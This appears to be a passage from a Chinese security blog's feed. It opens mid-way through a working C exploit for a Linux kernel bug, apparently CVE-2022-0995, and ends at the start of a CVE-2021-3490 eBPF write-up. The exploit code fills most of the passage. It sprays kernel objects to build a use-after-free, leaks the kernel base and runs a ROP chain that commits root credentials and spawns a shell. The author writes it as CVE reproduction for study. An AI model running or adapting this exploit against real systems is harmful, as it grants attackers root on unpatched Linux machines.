class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;secondary_msg = SECONDARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;primary_msg.mtext[<span class="number">0x8</span>], <span class="string">&quot;this is first msg_msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to create O_NOTIFICATION_PIPE!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;secondary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to read msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    trigger_overflow(oob_pipe_fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">1024</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to read msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            oob_qid = *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (victim_qid == <span class="number">-1</span> || oob_qid == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;[-] failed find victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] find victim id: %d, oob id: %d\n&quot;</span>, victim_qid, oob_qid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[oob_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (struct msg_msg *)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg))];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%p\n&quot;</span>,</span><br><span class="line">           nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> search_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)nearby_msg-&gt;m_list.prev;</span><br><span class="line">    search_addr = search_addr - <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="keyword">sizeof</span>(oob_msg.mtext);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = search_addr;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg_prim = (struct msg_msg *)&amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    <span class="keyword">uint64_t</span> victim_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    victim_addr = victim_addr - <span class="number">0x400</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%p\n&quot;</span>,</span><br><span class="line">           nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%p\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = victim_addr + <span class="number">0x800</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = victim_addr + <span class="number">0x800</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;196082&quot;</span>, <span class="number">6</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span> =</span> (struct pipe_buffer *)&amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_addr, kernel_offset, kernel_base;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg,</span><br><span class="line">                     <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got pipe_buf_ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_offset = (kernel_addr - <span class="number">0xffffffff8203fe40</span>);</span><br><span class="line">                kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%p \033[32m\033[1moffset: \033[0m%p\n&quot;</span>,</span><br><span class="line">           kernel_base, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff810938f0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = <span class="number">0xffffffff82c6d580</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_cred = <span class="number">0xffffffff810d25c0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00ff0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> push_rsi_pop_rsp_pop_4reg_ret = <span class="number">0xffffffff812dbede</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;196082&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span> =</span> (struct pipe_buf_operations *)&amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = push_rsi_pop_rsp_pop_4reg_ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rop = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *rop_chain;</span><br><span class="line"></span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span> *)&amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop++] = pop_rdi;</span><br><span class="line">    rop_chain[rop++] = init_cred;</span><br><span class="line">    rop_chain[rop++] = commit_cred;</span><br><span class="line">    rop_chain[rop++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    rop_chain[rop++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[rop++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[rop++] = get_shell;</span><br><span class="line">    rop_chain[rop++] = user_cs;</span><br><span class="line">    rop_chain[rop++] = user_rflags;</span><br><span class="line">    rop_chain[rop++] = user_sp;</span><br><span class="line">    rop_chain[rop++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img   src="/images/image-20230821100144612.png"  alt="image-20230821100144612"></p><h3 id="pipe-buffer？"><a href="#pipe-buffer？" class="headerlink" title="pipe_buffer？"></a>pipe_buffer？</h3><p>这里主要说的是 <a class="link"   href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/" >向pipe_buffer说yes!<i class="fas fa-external-link-alt"></i></a> 这篇文章中的利用手法。</p><p>不太推荐，不过需要修改一下type的值为<code>0x306</code>，如果继续保持<code>0x30a</code>的话结果是偏移<code>0x400</code>这样对于<code>pipe_buffer</code>来说过于大了，容易飞出去，所以修改到<code>0x40</code>效果更佳。(不过我不知道为什么每次申请的时候他都给我结尾为<code>0x40</code>和<code>0xc0</code>的，好像就是故意的🤮)</p><p><img   src="/images/image-20230821104028747.png"  alt="image-20230821104028747"></p><p>虽然我们可以达到上图，但是在后续的利用中会出现一些问题，首先就是<code>pipe</code>对于申请数量的限制，超过510个时就出现了报错，这样会使成功率大打折扣。其次就是这里是页级的UAF，正如前面的所说，申请的数量较少那么我们在后续对<code>pipe</code>修改<code>size</code>分配堆块的时候从刚刚释放的页面内分配的概率又进一步减小了。当然，面对第二个问题我们可以事先分配很多<code>object</code>用于消耗内存中的<code>slab</code>。但是第一个问题却是硬伤无法解决，所以就我看来如果遇到页级的<code>off by one/null</code>这样的漏洞需要事先配置好堆风水的情况以外都不是特别推荐使用这一方法。</p><hr><p>参考链接:</p><p>​<a class="link"   href="https://arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/" >https://arttnba3.cn/2022/04/06/CVE-0X08-CVE-2022-0995/<i class="fas fa-external-link-alt"></i></a></p><p>​<a class="link"   href="https://elixir.bootlin.com/linux/v5.17-rc3/source" >https://elixir.bootlin.com/linux/v5.17-rc3/source<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实前两天复现了一个2023的CVE，本来打算写那一个的，但是对于那个CVE更多的是做工作上的适配，在一些小细节上的原理并没有掌握得特别透彻</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    <category term="CVE复现" scheme="https://196082.github.io/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="msg_msg" scheme="https://196082.github.io/tags/msg-msg/"/>
    
    <category term="watch queue" scheme="https://196082.github.io/tags/watch-queue/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3490复现</title>
    <link href="https://196082.github.io/2023/08/12/CVE-2021-3490/"/>
    <id>https://196082.github.io/2023/08/12/CVE-2021-3490/</id>
    <published>2023-08-12T13:30:19.000Z</published>
    <updated>2023-11-29T10:11:13.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近为了找工作疯狂复现CVE是真的太难了😭，今天才发现我工位旁边的居然是fmyy爷😭，属于是给跪了。</p><p>这次复现的这个CVE是一个关于ebpf的漏洞，如果各位没有相关的基础可以看一下这篇文章<a class="link"   href="https://cv196082.gitee.io/2022/10/10/CVE-2017-16995/" >CVE-2017-16995<i class="fas fa-external-link-alt"></i></a>，并且这次这个CVE的利用方法和以前做的一道题可以说是一摸一样，所以这次不会详细的介绍利用方法而是更倾向于解释如何构造之类的，具体的利用方法可以去看<a class="link"   href="https://cv196082.gitee.io/2023/01/06/d3bpf/" >d3bpf<i class="fas fa-external-link-alt"></i></a>。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>有过ebpf的基础都知道在载入一个ebpf程序的时候会对每条指令进行检查，而检查的函数就在<code>do_check</code>中，如果是一个ALU运算的话则会进入<code>check_alu_op</code>进行进一步检查，如果我们的运算方式是<code>and/or/xor</code>一类的则会进入<code>adjust_reg_min_max_vals</code>函数进行进一步的检查，在函数中最后会调用到<code> adjust_scalar_min_max_vals</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line"><span class="keyword">case</span> BPF_ADD:</span><br><span class="line">scalar32_min_max_add(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_add(dst_reg, &amp;src_reg);</span><br><span class="line">dst_reg-&gt;var_off = tnum_add(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_SUB:</span><br><span class="line">scalar32_min_max_sub(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_sub(dst_reg, &amp;src_reg);</span><br><span class="line">dst_reg-&gt;var_off = tnum_sub(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MUL:</span><br><span class="line">dst_reg-&gt;var_off = tnum_mul(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_mul(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_mul(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_AND:</span><br><span class="line">dst_reg-&gt;var_off = tnum_and(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_and(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_and(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_OR:</span><br><span class="line">dst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_XOR:</span><br><span class="line">dst_reg-&gt;var_off = tnum_xor(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">scalar32_min_max_xor(dst_reg, &amp;src_reg);</span><br><span class="line">scalar_min_max_xor(dst_reg, &amp;src_reg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在这个函数中会根据<code>opcode</code>的不同而进入不同的分支，以and为例，其会调用<code>scalar32_min_max_and</code>和<code>scalar_min_max_and</code>计算32位以及64位的边界值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 